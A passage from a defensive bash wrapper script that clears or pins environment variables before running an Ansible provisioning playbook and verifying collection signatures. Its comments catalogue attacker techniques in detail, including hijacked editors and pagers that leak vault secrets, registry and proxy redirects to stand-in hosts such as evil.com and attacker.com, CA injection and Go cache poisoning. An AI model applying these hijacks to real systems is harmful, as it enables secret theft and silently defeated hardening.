unset ANSIBLE_FORCE_HANDLERS  # force-handlers injection: ANSIBLE_FORCE_HANDLERS=true fires ALL queued handlers at end-of-play even when the play fails mid-sequence; handlers (Restart sshd, Apply sysctl, Apply firewall rules, Remount /tmp) run as root against a partially-written config, producing a hardening-gap state
export ANSIBLE_CALLBACK_PLUGINS=""  # block callback plugin path hijacking — prevents exfiltration of slurp task results via malicious callback
export ANSIBLE_STDOUT_CALLBACK="default"  # pin stdout callback — prevents ANSIBLE_STDOUT_CALLBACK=evil_cb injecting a callback that receives all task results (vault secrets, authorized_keys, registry tokens)
unset ANSIBLE_CALLBACKS_ENABLED  # ANSIBLE_CALLBACK_PLUGINS="" only blocks legacy path-based callbacks; collection-namespaced callbacks (community.general.log_plays, community.general.syslog_json) load via ANSIBLE_COLLECTIONS_PATH which IS set — ANSIBLE_CALLBACKS_ENABLED=community.general.log_plays + ANSIBLE_LOG_FOLDER=/tmp/evil writes vault-decrypted task results to disk outside sudo's env_reset window
unset ANSIBLE_CALLBACK_WHITELIST  # pre-2.15 alias for ANSIBLE_CALLBACKS_ENABLED; some Ansible versions still honour it alongside the canonical name
unset ANSIBLE_ENABLE_TASK_DEBUGGER  # ANSIBLE_ENABLE_TASK_DEBUGGER=true drops into interactive task debugger on any failure; 'p task.args' in the debugger prints all task arguments including vault-decrypted SSH keys, registry tokens, and passwords
unset ANSIBLE_LOG_FOLDER  # log_plays output directory control — log_plays reads ANSIBLE_LOG_FOLDER (default /var/log/ansible/hosts/); without this unset an attacker sets ANSIBLE_LOG_FOLDER=/tmp/evil/ to make the log_plays callback write to an attacker-controlled writable path
unset ANSIBLE_LOG_PATH  # general Ansible run log — note: ANSIBLE_LOG_PATH is separate from ANSIBLE_LOG_FOLDER (log_plays); Ansible core reads this env var as ansible.cfg log_path; if set by an attacker, all task output (including debug output of vault-decrypted vars) is written to the specified path
# ansible.cfg sets display_args_to_stdout=false, but ANSIBLE_DISPLAY_ARGS_TO_STDOUT env var
# takes precedence over the ini-file setting and bypasses it entirely; when set to true, Ansible
# prints full task arguments (content=, dest=, key=, binary URLs, git host FQDNs) to stdout for
# every task lacking no_log: true — in a logged tmux session, CI artifact, or SSH transcript this
# exposes internal infrastructure details; tasks with no_log: true (SSH keys, vault secrets) are
# immune but the defence-in-depth sanitization layer must cover this env var explicitly.
unset ANSIBLE_DISPLAY_ARGS_TO_STDOUT
export ANSIBLE_HASH_BEHAVIOUR=replace  # pin dict merge semantics — ANSIBLE_HASH_BEHAVIOUR=merge lets attacker-supplied -e dicts merge key-by-key with role-default security dicts instead of replacing them, potentially injecting keys without triggering replacement-based detection; 'replace' is the Ansible default and the only safe mode
export ANSIBLE_INJECT_FACT_VARS=True  # pin fact injection — ANSIBLE_INJECT_FACT_VARS=False disables injection of ansible_facts dict keys as bare vars (ansible_distribution, ansible_user_dir, etc.); bare-var references in install_dnf_packages.yml (lines 13,19) and csb-report.yml (lines 98,108) evaluate as Undefined when injection is off; Undefined != 'Fedora' is True in Jinja2 so packages_security_rhel is appended on Fedora and repo_gh_cli guard evaluates incorrectly; bare ansible_user_dir in csb-report.yml becomes Undefined causing a template error; dict-form ansible_facts['key'] references used in pre_flight_checks.yml and csb_detect.yml are immune but the bare-var paths are not
export ANSIBLE_BECOME_FLAGS=  # strip injected become flags — ANSIBLE_BECOME_FLAGS='-l' constructs 'sudo -l -u root ...' which prints allowed commands and exits without running the play; other flags can alter sudo behavior per policy in subtle ways; the playbook requires no non-default become flags so forcing empty is safe
export ANSIBLE_BECOME_ASK_PASS=False  # prevent interactive become-password prompt — ANSIBLE_BECOME_ASK_PASS=True forces Ansible to open /dev/tty for the sudo password; in tmux sessions without a controlling tty or in CI this hangs or errors immediately, blocking all Play 1 become tasks (provisioning DoS); playbook uses vault or the invoking user's cached sudo credentials, so ask-pass is never needed
export ANSIBLE_DIFF_ALWAYS=False  # suppress forced diff output — ANSIBLE_DIFF_ALWAYS=1 enables --diff globally for every file-writing task; in a logged tmux session or with stdout piped to tee/CI artifact this prints vault-derived content: authorized_keys (vault_ssh_public_keys), SSH private key material written to ~/.ssh/, registry token files, sshd drop-in contents, PAM config; False matches Ansible's default and ensures no caller-set value forces diff mode
export ANSIBLE_VERBOSITY=0  # suppress caller-set verbosity — ANSIBLE_VERBOSITY=4 (equivalent to -vvvv) dumps full connection parameters, task variable dictionaries, and module argument payloads to stdout; this path is separate from no_log: true result suppression and bypasses it entirely, exposing sysctl hardening dict contents, authorized_keys payloads, SSH private key material, and registry token parameters in tmux scrollback or any stdout-logging pipeline; 0 matches Ansible's default and overrides any caller-set value
export ANSIBLE_NO_LOG=False  # prevent tamper-concealment via output suppression — ANSIBLE_NO_LOG=True suppresses ALL task output (results, changed/ok status, warnings, error messages) while the play runs to completion; an attacker pre-sets this to hide hardening gaps (failed sysctl, missed firewall rules, unapplied PAM config) from operator view; False matches Ansible's default and does not weaken per-task no_log: true directives, which operate independently at the task-result layer
export ANSIBLE_DISPLAY_ARGS_TO_STDOUT=False  # suppress task-argument display — ANSIBLE_DISPLAY_ARGS_TO_STDOUT=True prints all task arguments (module params) alongside task names in Ansible output; ansible.cfg sets display_args_to_stdout=false but env vars take precedence over ansible.cfg; without this pin an attacker pre-sets the env var to expose vault-decrypted values (authorized_keys entries, SSH private key material, registry tokens, PAM config) in terminal output, tmux scrollback, or CI log artifacts; False matches Ansible's default and overrides any caller-set value
export ANSIBLE_TASK_TIMEOUT=0  # pin task timeout to disabled — ANSIBLE_TASK_TIMEOUT=1 kills every task action after 1 second; dnf install, sysctl apply, sshd restart, firewall, PAM writes, and audit rules all exceed this; each kill registers as an external failure absorbed by CSB rescue blocks, so provisioning 'completes' while sysctl hardening, sshd config, firewall rules, PAM config, and audit rules are all unapplied; mid-write truncation of files like /etc/sysctl.d/90-hardening.conf is also possible; 0 (the Ansible default) disables the timeout entirely
unset MOLECULE_PROJECT_DIRECTORY  # attacker-controlled path redirects include_tasks to bypass pre_flight_checks.yml
unset MOLECULE_SCENARIO_NAME  # prevent molecule-context bypass on real hosts
export ANSIBLE_LOOKUP_PLUGINS=""  # shadowed env plugin can forge _pf_is_molecule=true, bypassing all security assertions
unset CONTAINERS_CONF CONTAINER_STORAGE_CONF CONTAINER_HOST DOCKER_HOST PODMAN_HOST  # prevent socket/runtime hijacking — attacker-set CONTAINERS_CONF=/tmp/evil/containers.conf can point [engine] runtime at a malicious OCI runtime binary that executes with every podman call (distrobox assemble create, podman login, podman pull) while exiting 0; attacker-set CONTAINER_HOST/DOCKER_HOST/PODMAN_HOST redirects podman API calls (including vault credential writes via podman login) to an attacker-controlled socket
unset SIGNATURE_POLICY  # prevent signature-policy bypass — SIGNATURE_POLICY overrides the policy.json path at the libpod level, superseding the containers role's write to ~/.config/containers/policy.json; attacker sets SIGNATURE_POLICY=/tmp/evil/policy.json containing {"default":[{"type":"insecureAcceptAnything"}]} and all subsequent podman pull calls accept unsigned images from any registry, bypassing the pinned signature enforcement policy
unset REGISTRIES_CONFIG_PATH  # prevent registry mirror hijack — REGISTRIES_CONFIG_PATH overrides XDG_CONFIG_HOME-derived paths at the libpod level; attacker sets REGISTRIES_CONFIG_PATH=/tmp/evil/registries.conf containing a [[registry]] mirror entry redirecting the configured container image (e.g. registry.fedoraproject.org/fedora:44) to an attacker-controlled registry; the containers role writing ~/.config/containers/registries.conf in the same run does not protect because REGISTRIES_CONFIG_PATH takes precedence over XDG_CONFIG_HOME paths entirely
unset REGISTRY_AUTH_FILE  # prevent registry auth hijack — REGISTRY_AUTH_FILE has higher lookup priority than $XDG_CONFIG_HOME/containers/auth.json in both podman and oc; attacker pre-sets REGISTRY_AUTH_FILE=/tmp/evil-auth.json before invoking make all; the variable propagates via exec to ansible-playbook and then to every child process including oc image extract in install_subctl_versions.yml and podman pull invoked by distrobox assemble create; both read REGISTRY_AUTH_FILE at highest priority, overriding the XDG_CONFIG_HOME-based auth path, sending registry.redhat.io auth tokens to an attacker-controlled endpoint; the XDG_CONFIG_HOME pin at 4d0367da does not cover this because REGISTRY_AUTH_FILE bypasses XDG entirely
unset DOCKER_CONFIG  # prevent Docker-compat auth token theft — some oc versions, buildah, and skopeo fall back to $DOCKER_CONFIG/config.json for registry auth when REGISTRY_AUTH_FILE is absent; attacker pre-sets DOCKER_CONFIG=/tmp/evil-dir and plants a crafted config.json that routes registry auth tokens to an attacker-controlled endpoint during packages role oc image extract and containers role podman login flows; unsetting eliminates the Docker-compatibility auth fallback as an injection vector
unset XDG_RUNTIME_DIR  # prevent XDG socket hijack — podman CLI falls back to $XDG_RUNTIME_DIR/podman/podman.sock when CONTAINER_HOST/DOCKER_HOST/PODMAN_HOST are unset; attacker sets XDG_RUNTIME_DIR=/tmp/evil and creates /tmp/evil/podman/podman.sock to intercept all podman pull/run/login calls in the containers and distrobox roles; the local connection plugin does not require XDG_RUNTIME_DIR; systemd sets the canonical value at session start for interactive use outside provisioning
export MOLECULE_PODMAN_EXECUTABLE=podman  # pin podman executable — molecule-podman driver reads this via os.environ.get('MOLECULE_PODMAN_EXECUTABLE', 'podman'); an attacker-set path bypasses PATH pin and routes privileged container calls (privileged:true in fedora/rocky scenarios) through an arbitrary binary
unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_OBJECT_DIRECTORY GIT_ALTERNATE_OBJECT_DIRECTORIES  # prevent git directory hijack — attacker-set GIT_DIR=/tmp/evil.git redirects all git operations (including transcrypt filter installs in the notes role) to an attacker-controlled repository; transcrypt reads GIT_DIR to locate the repo and writes filter.crypt.clean/smudge/diff/merge config entries there instead of the real notes repo, so encryption filters are never installed and encrypted blobs are read/written as plaintext; GIT_WORK_TREE, GIT_INDEX_FILE, GIT_OBJECT_DIRECTORY, and GIT_ALTERNATE_OBJECT_DIRECTORIES provide equivalent hijack paths for the working tree, index, object store, and alternate object lookup
unset GIT_TEMPLATE_DIR  # prevent git template injection — attacker-set GIT_TEMPLATE_DIR=/tmp/evil copies malicious hooks into every repo cloned by git_repos role; hooks fire at clone time in user context with full SSH agent access and persist after provisioning ends
unset GIT_EXEC_PATH  # git-internal subcommand resolver — git resolves git-fetch/git-clone/git-remote via GIT_EXEC_PATH before PATH; a fake /tmp/evil/git-fetch can exfiltrate SSH agent sockets or silently patch cloned source before Ansible sees exit 0; not covered by the PATH pin below
unset GIT_SSH GIT_SSH_COMMAND  # prevent SSH binary hijack — ansible.builtin.git re-exports GIT_SSH/GIT_SSH_COMMAND verbatim (absolute path, bypasses PATH pin) as the SSH wrapper for every git clone; attacker binary inherits SSH_AUTH_SOCK and can exfiltrate credentials or MITM cloned source
unset SSH_ASKPASS SSH_ASKPASS_REQUIRE DISPLAY  # prevent askpass injection — SSH_ASKPASS_REQUIRE=force (OpenSSH 8.4+) causes ssh to invoke $SSH_ASKPASS unconditionally even without a tty, regardless of DISPLAY; an attacker-set SSH_ASKPASS=/tmp/log.sh receives any passphrase/password prompts from ssh subprocesses spawned by ansible.builtin.git (affects internal SSH git hosts configured via ssh_work_keyscan_hosts that support keyboard-interactive/password auth); DISPLAY cleared to remove the pre-8.4 fallback gating path; provisioning does not require any of these variables
unset SSH_AUTH_SOCK  # prevent agent socket proxy attack — with GIT_SSH/GIT_SSH_COMMAND cleared, git falls back to /usr/bin/ssh which reads SSH_AUTH_SOCK from the inherited environment; a pre-set SSH_AUTH_SOCK=/tmp/evil.sock proxy socket receives every signing request from all SSH-URL git clones (16+ repos + notes), enabling silent credential logging or source MITM; Ansible itself does not require SSH_AUTH_SOCK
unset GIT_CONFIG_GLOBAL  # attacker-controlled global git config — GIT_CONFIG_GLOBAL=/tmp/evil.gitconfig can inject url.insteadOf to silently redirect all HTTPS GitHub clones to an attacker server, or inject core.fsmonitor=/tmp/evil_script to execute arbitrary code on every git-status call (fsmonitor is separate from core.hooksPath and bypasses the hooks guard)
unset XDG_CONFIG_HOME XDG_CACHE_HOME XDG_DATA_HOME XDG_STATE_HOME XDG_RUNTIME_DIR  # XDG base-dir hijack — git reads $XDG_CONFIG_HOME/git/config as user-level config when GIT_CONFIG_GLOBAL is unset (git-config fallback order: GIT_CONFIG_GLOBAL → $XDG_CONFIG_HOME/git/config → ~/.gitconfig); an attacker who sets XDG_CONFIG_HOME=/tmp/evil before invoking make all causes every git clone/fetch in the git_repos role to read /tmp/evil/git/config, enabling url.insteadOf HTTPS redirect to attacker server and core.fsmonitor RCE on every git-status call; GIT_CONFIG_NOSYSTEM=1 in git_repos role env blocks only blocks /etc/gitconfig, not the XDG user config path; clearing all XDG dirs is defense-in-depth (XDG_CACHE_HOME/XDG_DATA_HOME/XDG_STATE_HOME used by other tools that may read config from those paths)
# NOTE: GIT_CONFIG_NOSYSTEM is NOT unset here — GIT_CONFIG_NOSYSTEM=1 is explicitly set in the
# clone and pull task environment blocks in roles/git_repos/tasks/main.yml, which prevents
# /etc/gitconfig from being read during provisioning clones (core.fsmonitor RCE, url.insteadOf
# redirect). Unsetting it from the outer shell env would only affect ansible-playbook itself;
# the per-task environment block is the correct enforcement point for git subprocesses.
unset GIT_HTTP_PROXY_AUTHMETHOD  # defense-in-depth: prevents downgrade of proxy auth to basic-auth when HTTPS_PROXY is set, which would send GitHub tokens in cleartext to the proxy
unset KUBECONFIG KUBE_CONFIG_PATH KUBE_CONTEXT KUBE_APISERVER KUBE_TOKEN KUBE_CERT_AUTH KUBE_CLIENT_CERT KUBE_CLIENT_KEY  # prevent kubeconfig hijack — attacker-set KUBECONFIG=/tmp/evil-kubeconfig redirects any future cluster-touching task (helm install, kubectl apply, kind create cluster, krew plugin) to an attacker-controlled cluster; current blast radius is zero but defense-in-depth prevents silent redirection if cluster tasks are added
unset HTTPS_PROXY HTTP_PROXY ALL_PROXY https_proxy http_proxy all_proxy  # prevent proxy interception — caller-set proxy vars pass through to ansible-playbook and every child task (binary downloads, go module fetches, git clones); a MITM proxy sees all version strings and can 502-abort selective tasks; use network_proxied in config.yml for the supported go-module proxy mechanism
unset NPM_CONFIG_REGISTRY  # prevent npm registry redirect — NPM_CONFIG_REGISTRY=https://evil.com/ redirects all npm package fetches to an attacker-controlled server during Claude Code installation (roles/claude install.sh invocation has no lockfile); npm does not verify package signatures by default, so an attacker-controlled registry can serve arbitrary package content; the CI assertion in linting.yml is not a runtime mitigation for local Ansible provisioning runs
unset SIGSTORE_NO_VERIFY SIGSTORE_ROOT_FILE SIGSTORE_REKOR_PUBLIC_KEY COSIGN_EXPERIMENTAL  # Sigstore/cosign trust chain — SIGSTORE_NO_VERIFY=1 skips all Rekor/Fulcio verification; SIGSTORE_ROOT_FILE=/tmp/evil.pem substitutes a malicious root CA; SIGSTORE_REKOR_PUBLIC_KEY=/tmp/evil.pub replaces Rekor's transparency log key; COSIGN_EXPERIMENTAL=1 changes verification semantics; any of these bypass cosign verify-blob trust chain for cosign self-verification and sops checksums verification
unset GNUPGHOME GPG_AGENT_INFO  # GPG homedir injection — GNUPGHOME=/tmp/evil-gpg points gpg at an attacker-controlled keyring containing only the attacker's own key; attacker pre-signs a malicious SHA256SUMS.asc with that key and replaces collection tarballs whose hashes match a replacement SHA256SUMS; verify-collections.sh gpg --verify exits 0 (good signature by the attacker key), sha256sum -c passes against the malicious tarballs, and the Python manifest delta check passes if both tarball and disk were replaced consistently; result: attacker-controlled collection code is loaded as root across all 13 roles; verify-collections.sh also unsets GNUPGHOME immediately before its gpg call (defence-in-depth), but clearing it here prevents propagation to the subprocess in the first place; GPG_AGENT_INFO cleared to prevent agent socket hijack
unset GOPROXY GOSUMDB GONOSUMDB GOFLAGS GOENV GOPRIVATE GOCACHE GOMODCACHE GOROOT GOWORK GOTMPDIR  # Go env injection: GOPROXY redirects module downloads to attacker proxy; GOSUMDB=off disables checksum database verification entirely (defence-in-depth — distrobox go install tasks pin GOSUMDB=sum.golang.org in their environment blocks, but unsetting here prevents inheritance from outer shell); GONOSUMDB=* disables checksum verification for all modules; GOFLAGS injects arbitrary go build flags; GOENV=/tmp/evil sets all of the above via a file the Go toolchain reads before per-command env vars (printenv shows no suspicious values yet go uses them); GOPRIVATE=* causes Go to set effective GONOSUMDB=* when GONOSUMDB is unset (Go's documented behavior: GONOSUMDB defaults to GOPRIVATE), bypassing checksum database for all go install tasks (golangci-lint, subctl); GOCACHE=/tmp/attacker_cache pre-stages malicious compiled binaries at precomputed ActionID cache keys — Go installs a cache hit without recompiling, so an attacker who knows the pinned module versions (public in roles/packages/defaults/main.yml) can precompute the exact cache key offline and substitute an attacker binary; unsetting forces Go to use its default per-user cache (~/.cache/go-build) which is not attacker-writable under normal conditions; GOWORK=/tmp/evil/go.work activates Go workspace mode which reads replace directives from the specified go.work file — replace directives redirect module resolution to local paths that are never checked against GOSUMDB (workspace mode bypasses the checksum database by design), allowing an attacker to substitute arbitrary code for any Go module used by go install (golangci-lint, subctl, gofumpt) across all three go install sites (install_go_tools.yml, install_subctl_versions.yml, container-provision.yml); unsetting disables workspace mode entirely (equivalent to GOWORK=off)
unset SSL_CERT_FILE SSL_CERT_DIR  # TLS CA injection for Ansible uri:/get_url: — Ansible's module_utils.urls uses Python ssl, not the requests library; ssl.create_default_context(cafile=None) calls load_default_certs() which calls set_default_verify_paths(), invoking OpenSSL's SSL_CTX_set_default_verify_paths() which reads SSL_CERT_FILE (single PEM file) and SSL_CERT_DIR (directory of PEM/CRT files); an attacker-set SSL_CERT_FILE=/tmp/evil.pem injects an attacker-controlled CA into every Ansible HTTPS connection during provisioning — all uri: and get_url: tasks across all 13 roles, including binary downloads (kind, helm, kustomize, k9s, cosign, sops, gitleaks, operator-sdk, tkn, ec), GitHub API calls (ssh role known-hosts meta, go sum.golang.org reachability probe), and distrobox oc checksum fetch; tasks with no post-download integrity check (ssh GitHub meta, go reachability) are silently MITM-able; get_url: tasks using a checksum= param fetched over the same MITM-able connection lose that guard too; SSL_CERT_DIR=/tmp/evil-dir injects all .pem/.crt files in the attacker-controlled directory via get_ca_certs() directory scan (urls.py line 532-583); unset REQUESTS_CA_BUNDLE is separate — it does not affect Ansible core modules
unset GIT_SSL_NO_VERIFY GIT_SSL_CAINFO GIT_SSL_CAPATH  # git TLS bypass — GIT_SSL_NO_VERIFY=true maps to CURLOPT_SSL_VERIFYPEER=0 and completely disables TLS certificate verification for all git HTTPS operations (clones, fetches, pushes); GIT_SSL_CAINFO=/tmp/evil.pem maps to CURLOPT_CAINFO and substitutes an attacker-controlled CA bundle, allowing MITM of HTTPS git clones while verification appears to succeed; GIT_SSL_CAPATH is the directory-form equivalent of GIT_SSL_CAINFO; ansible.builtin.git forks the git binary which inherits these vars from the calling process — the task environment: block in notes/tasks/main.yml only adds GIT_TERMINAL_PROMPT=0 and does not create an isolated env; the notes role uses ansible.builtin.git with notes_remote_url_https as an SSH fallback (HTTPS URL), making it the primary at-risk consumer; these vars survive clearing CURL_CA_BUNDLE (above) because git reads them before libcurl processes the standard env var
unset REQUESTS_CA_BUNDLE  # requests library CA injection — Ansible's core uri: and get_url: modules do NOT use the requests library (they use ansible.module_utils.urls with urllib/ssl, confirmed by grep of get_url.py and urls.py); this var does not affect Ansible HTTPS verification directly; however pip (invoked via pipx in install_pipx.yml for yamllint/ansible-lint) uses requests internally and falls back to REQUESTS_CA_BUNDLE when PIP_CERT is unset (cleared above); an attacker-set REQUESTS_CA_BUNDLE=/tmp/evil.pem causes pipx/pip HTTPS TLS verification to trust an attacker CA during yamllint and ansible-lint installation; also affects any collection modules that import requests directly
unset CURL_CA_BUNDLE CURL_HOME CURLOPT_CAPATH  # curl CA/config injection — CURL_CA_BUNDLE is libcurl's documented standard env var for a PEM CA bundle file (the primary CA override; CURLOPT_CAPATH is the less-common directory-form alternative); all bare curl shell tasks in repos_dnf/tasks/main.yml (lines 256, 330, 394: Red Hat internal GPG key, RPM Fusion free/nonfree GPG keys) run in ansible.builtin.shell without an environment: block and inherit both vars; CURL_CA_BUNDLE=/tmp/evil.pem lets a MITM proxy serve a fake GPG key over a TLS connection that curl accepts — the gpg --with-colons fingerprint check is the only remaining guard for those tasks; CURL_HOME=/tmp/evil causes curl to read /tmp/evil/.curlrc ('proxy = http://attacker.com' or 'insecure') routing all curl invocations through an attacker-controlled proxy before the fingerprint check runs; CURLOPT_CAPATH overrides the CA certificate directory
unset DBUS_SESSION_BUS_ADDRESS  # D-Bus socket poisoning — dconf.py (community.general.dconf) reads DBUS_SESSION_BUS_ADDRESS first via os.environ.get before the canonical /run/user/<uid>/bus socket; _validate_address only requires dbus-send exit 0, which any cooperating fake daemon satisfies; an attacker-set DBUS_SESSION_BUS_ADDRESS=unix:path=/tmp/evil.sock routes all community.general.dconf calls (GNOME settings in roles/desktop/tasks/main.yml: show-in-lock-screen, location/enabled, remember-recent-files) to a fake daemon that silently no-ops; unsetting forces dconf.py to fall through to /run/user/<uid>/bus (canonical, non-spoofable) or dbus-run-session fallback; system-level CIS dconf hardening (roles/system/tasks/dconf.yml) writes to /etc/dconf/db/ via ansible.builtin.copy and is not affected
unset DBUS_SYSTEM_BUS_ADDRESS  # D-Bus system bus socket poisoning — libdbus reads DBUS_SYSTEM_BUS_ADDRESS at the C level (before Python) and uses it in preference to the compiled-in /run/dbus/system_bus_socket default; GDBus (used by nmcli/libnm) also honours this env var via the same path; FirewallClient.__init__() (firewall/client.py) calls dbus.SystemBus() with no explicit address argument, so an attacker-set DBUS_SYSTEM_BUS_ADDRESS=unix:path=/tmp/evil.sock routes all 16 ansible.posix.firewalld calls in roles/system/tasks/firewall.yml (drop zone, SSH port 722, ICMP rules, FedoraWorkstation zone removal, libvirt zone) and both calls in roles/system/tasks/nm.yml (tailscale0 trusted, wt0 trusted) to a fake daemon that returns success; nftables state is never changed; firewall hardening is silently bypassed while provisioning reports success; unsetting forces libdbus to connect to /run/dbus/system_bus_socket (canonical, non-spoofable)
export ANSIBLE_BECOME_METHOD=sudo  # pin become_method — ANSIBLE_BECOME_METHOD=su activates the su plugin which reads its own executable path from ANSIBLE_SU_EXE; neither is constrained by become_exe=/usr/bin/sudo in ansible.cfg, so an attacker can route all become tasks (system, packages, repos_dnf roles) through an arbitrary binary; pinning to sudo ensures only the sudo plugin is used
unset ANSIBLE_SU_EXE ANSIBLE_PFEXEC_EXE ANSIBLE_SUDO_EXE  # remove per-plugin exe escape paths — each alternative become plugin (su, pfexec, sudo) exposes its own executable env var; clearing all three prevents ANSIBLE_BECOME_METHOD override from activating a residual attacker-controlled executable even if pinning above is somehow circumvented
unset WGETRC  # wget config injection — WGETRC=/tmp/evil.rc redirects wget output path or disables certificate checking; neither shell task has an environment: block so the var is fully inherited; unsetting forces wget to use compiled-in defaults (CURL_HOME already cleared above with CURL_CA_BUNDLE)
unset EDITOR VISUAL ANSIBLE_EDITOR GIT_EDITOR  # editor injection — ansible-vault consults ANSIBLE_EDITOR > VISUAL > EDITOR in priority order and passes the decrypted vault path as $1 to the chosen binary; a pre-set ANSIBLE_EDITOR=/tmp/evil.sh exfiltrates vault plaintext before re-encrypting cleanly with exit 0; GIT_EDITOR similarly hijacks interactive git operations; EDITOR/VISUAL also inherited by git hooks and any task that invokes $EDITOR
unset GIT_COMMITTER_NAME GIT_COMMITTER_EMAIL GIT_COMMITTER_DATE GIT_AUTHOR_NAME GIT_AUTHOR_EMAIL GIT_AUTHOR_DATE GIT_SEQUENCE_EDITOR  # git identity/rebase-editor injection — GIT_COMMITTER_* and GIT_AUTHOR_* override commit authorship for any git commit executed during provisioning (current blast radius is zero: transcrypt 2.3.2 has no executable commit paths and git_repos uses clone-only; future roles adding git commit tasks would inherit poisoned authorship silently); GIT_SEQUENCE_EDITOR redirects interactive rebase editor to an attacker binary (GIT_EDITOR, cleared above, is skipped for interactive rebase in favour of GIT_SEQUENCE_EDITOR); clearing all seven eliminates inherited authorship spoofing and rebase-editor hijack for any future provisioning task that runs git commit or git rebase -i
unset PAGER ANSIBLE_PAGER MANPAGER SYSTEMD_PAGER GIT_PAGER  # pager injection — ansible-vault view decrypts vault and pipes plaintext to the pager binary via subprocess.Popen(pager, shell=True, stdin=subprocess.PIPE) (cli/__init__.py line 527); Ansible reads ANSIBLE_PAGER first then PAGER as fallback (base.yml DEFAULT_PAGER); PAGER=/tmp/evil.sh exfiltrates all vault plaintext (SSH private keys, authorized_keys, registry tokens) to an attacker-controlled binary; MANPAGER and GIT_PAGER are fallback pager env vars consumed by man/git respectively (git-diff, git-log pipe through GIT_PAGER); SYSTEMD_PAGER is the systemd equivalent consumed by systemctl/journalctl; clearing all five prevents pager-chain exfiltration regardless of invocation path; defence-in-depth for vault-view/vault-diff Makefile targets routed through VERIFY_AND_RUN
export PATH=/usr/local/bin:/usr/bin:/bin  # pin PATH — prevents PATH=/attacker:$PATH hijacking args[0] resolution
export ANSIBLE_SHELL_EXECUTABLE=/bin/bash  # pin shell binary — ANSIBLE_SHELL_EXECUTABLE overrides the shell used for every shell: task and AnsiballZ module invocation across all 13 roles, including become:true plays; ANSIBLE_BECOME_EXE does not constrain it; 'ANSIBLE_SHELL_EXECUTABLE=/tmp/evil_sh make all' routes all task execution through an arbitrary binary with full access to become-elevated module staging
unset ANSIBLE_SHELL_TYPE                   # prevent shell negotiation override — ANSIBLE_SHELL_TYPE=fish/csh activates alternative quoting/escaping paths in shell plugins, potentially breaking module command construction or activating code paths with different security properties; always negotiate bash (default)
export ANSIBLE_BECOME_EXE=/usr/bin/sudo  # pin become_exe — ANSIBLE_BECOME_EXE env var takes precedence over ansible.cfg become_exe; without this pin, 'ANSIBLE_BECOME_EXE=/tmp/evil make all' routes every Play 1 become task through an arbitrary binary that can exec real sudo transparently while silently rewriting sshd_config, authorized_keys, and audit rules
export ANSIBLE_BECOME_USER=root  # pin become_user — ANSIBLE_BECOME_USER env var overrides the implicit root default for all Play 1 become: true tasks; 'ANSIBLE_BECOME_USER=dfarrell make all' causes sudo to run as the invoking user rather than root, making all system file writes (sysctl, sshd_config, PAM, audit rules, firewall) fail with EACCES; many failures are swallowed by CSB rescue blocks leaving the host unhardened while provisioning appears to succeed
unset ANSIBLE_BECOME_ALLOW_SAME_USER  # prevent become-user enforcement weakening — ANSIBLE_BECOME_ALLOW_SAME_USER=True permits become when become_user == ansible_user, bypassing the target-user check that guards privilege separation; combined with ANSIBLE_BECOME_USER manipulation can silently soften enforcement; default (unset) is deny
unset ANSIBLE_BECOME_PASS ANSIBLE_SUDO_PASS  # strip pre-seeded become password — ANSIBLE_BECOME_PASS=wrong_password causes all Play 1 become:true tasks to fail with sudo auth errors; CSB rescue blocks silently absorb the failures (logged to CSB report, provisioning continues) leaving the host unhardened; additionally a pre-seeded ANSIBLE_BECOME_PASS exposes the plaintext credential in /proc/<pid>/environ to any root process during provisioning; the playbook uses cached sudo credentials (NOPASSWD or interactive prompt via sudo), not env-var credentials, so these vars are never needed

# Verify collections integrity (defense-in-depth: supply chain verification).
# GPG key verification is automatically bypassed for non-provisioning invocations
# (--syntax-check, molecule, ansible-lint) where only playbook syntax is checked,
# not actual collection code execution. Production provisioning requires the key.
_is_syntax_only=false
for _arg in "${args[@]}"; do
    [[ "$_arg" == '--syntax-check' ]] && _is_syntax_only=true && break
done
if "$_is_syntax_only"; then
    export SKIP_GPG_VERIFY=1
fi
"${_repo_root}/scripts/verify-collections.sh"

# All checks passed — exec the remaining arguments (ansible-playbook or molecule with its args).
# Using exec replaces this script's process with the command, preserving exit codes and
# signals. The Makefile uses: scripts/verify-ansible-args.sh ansible-playbook site.yml ...
# which passes the full command as $@.
if [[ ${#args[@]} -gt 0 ]]; then
    exec "${args[@]}"
fi
